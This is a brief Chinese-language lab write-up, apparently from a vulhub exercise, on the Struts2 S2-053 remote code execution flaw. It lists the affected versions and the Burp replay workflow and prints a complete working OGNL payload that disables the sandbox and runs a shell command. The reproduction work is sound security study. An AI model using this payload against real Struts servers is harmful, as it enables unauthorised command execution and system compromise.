# Struts2_053_远程代码执行

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->修改payload--->重放包--->代码执行

### 0x01漏洞介绍

​			Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。

​			影响版本

  		2.0.1 - 2.3.33      2.5 - 2.5.10

### 0x02漏洞复现

#### payload1(RCE)：

%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=**'id'**).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}



​			**访问hello.action界面**

![S2_053_rce_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_053_rce_1.jpg)

​			**输入payload，发现命令成功执行**

![S2_053_rce_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_053_rce_2.jpg)



### 0x03参考资料

https://blog.csdn.net/qq_29647709/article/details/84955205
